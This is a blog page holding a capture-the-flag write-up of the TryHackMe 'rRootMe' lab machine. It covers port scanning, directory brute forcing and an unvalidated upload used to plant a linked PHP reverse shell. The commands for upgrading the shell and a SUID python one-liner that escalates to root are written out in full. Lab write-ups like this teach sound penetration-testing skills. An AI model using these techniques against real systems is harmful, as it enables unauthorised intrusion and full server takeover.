<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=7af3e529e68bd49fdb3bd8cab1852fad17075089">

<!-- Begin Jekyll SEO tag v2.6.1 -->
<title>m3dsec - rRootMe Write-up | APTx1337 InfoSec Blog</title>
<meta name="generator" content="Jekyll v3.9.0" />
<meta property="og:title" content="m3dsec - rRootMe Write-up" />
<meta property="og:locale" content="en_US" />
<link rel="canonical" href="https://aptx1337.github.io/posts/thm/rrootme.html" />
<meta property="og:url" content="https://aptx1337.github.io/posts/thm/rrootme.html" />
<meta property="og:site_name" content="APTx1337 InfoSec Blog" />
<script type="application/ld+json">
{"@type":"WebPage","url":"https://aptx1337.github.io/posts/thm/rrootme.html","headline":"m3dsec - rRootMe Write-up","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>APTx1337 InfoSec Blog</h1>
        </a>
        <h2></h2>

        <section id="downloads">
          
          <a href="https://github.com/APTx1337/APTx1337.github.io" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <p><em><strong>Sep 09, 2020</strong></em></p>

<h2 id="overview">Overview</h2>

<p>this is a quick writeup, explaining how we got inside <a href="https://tryhackme.com/room/rrootme">rRootMe</a> machine from <a href="https://tryhackme.com/">tryhackme</a>.</p>

<h2 id="target-informations">Target Informations</h2>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domain name : rrootme.htb
ip address  : 10.10.128.17
Dificulty   : easy
Description : A ctf for beginners, can you root me?
</code></pre></div></div>

<p><br /></p>

<h2 id="external-enumeration">External Enumeration</h2>

<p><strong>Port Scaning</strong>
i’ll be using <strong>nmap</strong> as regular:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code> nmap -v -sC -sV -oN nmap/nmap_tcp_simple 10.10.128.17
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre></div></div>

<p><strong>Directory Brute Forcing</strong></p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>m3dsec@local:~/rrootme.htb$ ffuf -c -u http://10.10.128.17/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt 
uploads                 [Status: 301, Size: 314, Words: 20, Lines: 10]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10]
panel                   [Status: 301, Size: 312, Words: 20, Lines: 10]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
                        [Status: 200, Size: 616, Words: 115, Lines: 26]
                        [Status: 200, Size: 616, Words: 115, Lines: 26]
:: Progress: [62275/62275] :: Job [1/1] :: 238 req/sec :: Duration: [0:04:21] :: Errors: 3 ::
</code></pre></div></div>
<p><strong>panel</strong> and <strong>uploads</strong> Directories seems interstings</p>

<p><br /></p>

<h2 id="file-upload-vulnerability-direct-file-upload">File Upload Vulnerability (Direct file upload)</h2>

<p>visiting <strong>uploads</strong> folder, we get a Directory listing, that let us see what the folder contain, well its empty for now LOL</p>

<p><img src="../../assets/images/uploads_folder.png" alt="Panel" title="Directory Listign in the Folder Uploads" /></p>

<p><br /></p>

<p>also the <strong>Panel directory</strong> has an Upload function</p>

<p><img src="../../assets/images/panel_upload_function.png" alt="Panel" title="Upload Functionality in Panel Directory" /></p>

<p><br /></p>

<p>the server <strong>does not</strong> validate the type of files being uploaded (phtml at least, maybe other extentions too), therefor we can upload our malicious file to get a code execution on the server.</p>

<p>i’ll be uploading a <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">reverse shell</a>, with a <strong>.phtml</strong> extention</p>

<p>sounds like the file has been uploaded</p>

<p><img src="../../assets/images/file_uploaded.png" alt="Panel" title="Uploaded" /></p>

<p><br /></p>

<p>and we successfully got a reverse shell</p>

<p><img src="../../assets/images/reverse_shell.png" alt="terminal" title="Uploaded" /></p>

<p><br /></p>

<h2 id="internal-enumeration">Internal Enumeration</h2>

<p><strong>Getting a Full interactive shell</strong></p>

<p>lets 1st Upgrade to a full interactive shell with python pty module</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
CTRL+Z
stty -echo raw
fg
stty rows 41 columns 166
</code></pre></div></div>

<p><br /></p>

<p>### Binary Files with SUID Permission</p>

<p>while searching for <strong>suid</strong> files, we got a good list, and python is a one of them,</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@rootme:/home$ find / -perm /4000 2&gt;/dev/                                                                           
/usr/lib/dbus-1.0/dbus-daemon-launch-helpe
/usr/lib/snapd/snap-confine
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
...
/usr/bin/python
...
/usr/bin/chfn
/usr/bin/gpasswd
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@rootme:/home$ ls -lat /usr/bin/python 
-rwsr-sr-x 1 root root 3665768 Aug  4 17:47 /usr/bin/python
</code></pre></div></div>

<p><br /></p>

<h3 id="privelege-escalation">Privelege Escalation</h3>

<p>we can easly escalate our priveleges, <a href="https://gtfobins.github.io/gtfobins/python/#suid">GTFOBins</a> got a good set of priv escalation methods we can use.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@rootme:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@rootme:/$ /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=33(www-data) groups=33(www-data)
# cat /root/root.txt
THM{REDACTED}
</code></pre></div></div>
<p><br />
Best Regards</p>

<p><a href="https://twitter.com/m3dsec">m3dsec</a>.</p>

<p><br />
<br /></p>

<p><a href="/">back to main()</a></p>

<p><br />
<br /></p>

      </section>
    </div>

    
  </body>
</html>
